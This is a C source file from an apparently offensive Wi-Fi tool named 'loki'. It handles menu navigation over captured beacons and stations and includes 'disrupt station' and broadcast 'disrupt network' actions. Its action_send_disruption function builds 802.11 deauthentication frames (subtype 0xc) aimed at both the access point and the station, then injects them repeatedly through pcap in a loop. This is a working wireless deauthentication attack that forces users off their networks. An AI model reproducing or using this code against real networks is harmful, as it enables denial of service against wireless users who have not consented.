#include <stdlib.h>
#include "controllers.h"

void action_distrupt_station(struct loki_state*);
void action_distrupt_network(struct loki_state*);
void action_send_disruption(uint8_t*, uint8_t*, uint8_t*, uint16_t, pcap_t*);

struct mode_controller *create_mode_controller() {
	struct mode_controller *controller;

	controller = (struct mode_controller*)malloc(sizeof(struct mode_controller));

	return controller;
}

struct controller *create_controller() {
	struct controller *controller;

	controller = (struct controller*)malloc(sizeof(struct controller));

	return controller;
}

void controller_overview_left(int code, struct frame_log *log) {
}

void controller_overview_centre(int code, struct frame_log *log) {
	
	switch(code) {
	case 'j':
		if(log->beacon.selected + 1 < log->beacon.num)
			log->beacon.selected++;
		else
			log->beacon.selected = 0;
		break;
	case 'k':
		if(log->beacon.selected - 1 >= 0)
			log->beacon.selected--;
		else
			log->beacon.selected = log->beacon.num-1;

		break;
	}
}

void controller_overview_right(int code, struct frame_log *log) {
	switch(code) {
	case 'j':
		if(log->proberq.selected + 1 < log->proberq.num)
			log->proberq.selected++;
		else
			log->proberq.selected = 0;
		break;
	case 'k':
		if(log->proberq.selected - 1 >= 0)
			log->proberq.selected--;
		else
			log->proberq.selected = log->proberq.num-1;

		
		break;
	}
}

void controller_overview_mode(int code, struct loki_state *state) {
	switch(code) {

	case 'h':
	case 'l':
		if(state->controllers.overview->selected == state->controllers.overview->centre) {
			state->controllers.overview->selected = state->controllers.overview->right;
			state->log->beacon.selected = -1;
			state->log->proberq.selected = 0;
		} else {
			state->controllers.overview->selected = state->controllers.overview->centre;
			state->log->beacon.selected = 0;
			state->log->proberq.selected = -1;
		}
		break;

	case 'j':
	case 'k':
		state->controllers.overview->selected->input(code, state->log);
		break;

	case '\n':
		pthread_mutex_lock(&scrmutex);
		if(state->controllers.overview->selected == state->controllers.overview->centre) {
			state->current_controller = state->controllers.ap;
			state->current = state->screens.ap;
			pthread_mutex_unlock(&scrmutex);
		} else {
			state->current_controller = state->controllers.sta;
			state->current = state->screens.sta;
			pthread_mutex_unlock(&scrmutex);
		}
		break;
	}
}

void controller_ap_mode(int code, struct loki_state *state) {
	struct beacon_frame_item *item = state->log->beacon.list;
	struct macaddr_list_item *addr;
	int i = 0;
	switch(code) {
	case 'd':
		action_distrupt_station(state);
		break;

	case 'D':
		action_distrupt_network(state);
		break;

	case 'j':
		do {
			if(i++ == state->log->beacon.selected)
				break;
		} while( (item = item->next) != NULL);

		if(item->sta_selected + 1 == item->sta_count)
			item->sta_selected = 0;
		else
			item->sta_selected++;
		break;
	case 'k':
		do {
			if(i++ == state->log->beacon.selected)
				break;
		} while( (item = item->next) != NULL);

		if(item->sta_selected == 0)
			item->sta_selected = item->sta_count-1;
		else
			item->sta_selected--;
		break;
	case 0x1b:
		pthread_mutex_lock(&scrmutex);
		state->current_controller = state->controllers.overview;
		state->current = state->screens.overview;
		state->status_msg = NULL;
		pthread_mutex_unlock(&scrmutex);
		break;
	}
}

void controller_sta_mode(int code, struct loki_state *state) {
	switch(code) {
	case 0x1b:
		pthread_mutex_lock(&scrmutex);
		state->current_controller = state->controllers.overview;
		state->current = state->screens.overview;
		state->status_msg = NULL;
		pthread_mutex_unlock(&scrmutex);
		break;
	}
}

void action_distrupt_station(struct loki_state *state) {
	struct beacon_frame_item *item = state->log->beacon.list;
	struct macaddr_list_item *addr;
	uint8_t *macSta, *macAp;
	uint16_t i;

	i = 0;
	do {
		if(i++ == state->log->beacon.selected)
			break;

	} while( (item = item->next) != NULL);

	addr = item->list;
	macAp = item->mac;

	i = 0;
	if((addr = item->list) == NULL)
		return;

	do {
		if(i++ == item->sta_selected)
			break;

	} while( (addr = addr->next) != NULL);

	macSta = addr->addr;
	char *status = (char*)malloc(sizeof(char)*48);
	sprintf(status, "Disrupt station %s -> %s ", print_mac_address(macAp), print_mac_address(macSta));
	set_status_message(status, state);
}

void action_distrupt_network(struct loki_state *state) {
	struct beacon_frame_item *item = state->log->beacon.list;
	uint8_t macSta[6] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff },
		*macAp;
	uint16_t i;

	i = 0;
	do {
		if(i++ == state->log->beacon.selected)
			break;

	} while( (item = item->next) != NULL);

	macAp = item->mac;

	char *status = (char*)malloc(sizeof(char)*48);
	sprintf(status, "Disrupt network %s -> %s ", print_mac_address(macAp), print_mac_address(macSta));
	set_status_message(status, state);
}

void action_send_disruption(uint8_t *macAp, uint8_t *macSta, uint8_t *bssid, uint16_t num, pcap_t *handle) {
	struct header_radiotap *tap;
	struct mac80211_management_hdr *headerToSta, *headerToAp;
	struct mac80211_control ctrl;
	uint32_t total;
	uint8_t *packetToSta, *packetToAp;
	size_t lenSta, lenAp;

	ctrl = (struct mac80211_control) {
		.protocol = 0x0,
		.type = 0x0,
		.subtype = 0xc,
		.toDS = 0,
		.fromDS = 0,
		.frags = 0,
		.retry = 0,
		.powerman = 0,
		.data = 0,
		.protected = 0,
		.order = 0,
	};

	tap = construct_header_radiotap();

	headerToSta = construct_header_management(macAp, macSta, bssid, &ctrl);
	headerToAp = construct_header_management(macSta, macAp, bssid, &ctrl);

	total = 0;
	while(total < num) {
		headerToSta->seqctrl = total<<4;
		headerToAp->seqctrl = total<<4;
		packetToSta = construct_packet(tap, headerToSta, 0x7, &lenSta);

		packetToAp = construct_packet(tap, headerToAp, 0x3, &lenAp);
		
		if(total < 10)
			pcap_inject(handle, (void*)packetToSta, (int)lenSta);
		pcap_inject(handle, (void*)packetToAp, (int)lenAp);
		
		usleep(50000);
		printf("\r%05d packets", ++total);
		fflush(stdout);

		free(packetToSta);
		free(packetToAp);
	}
}
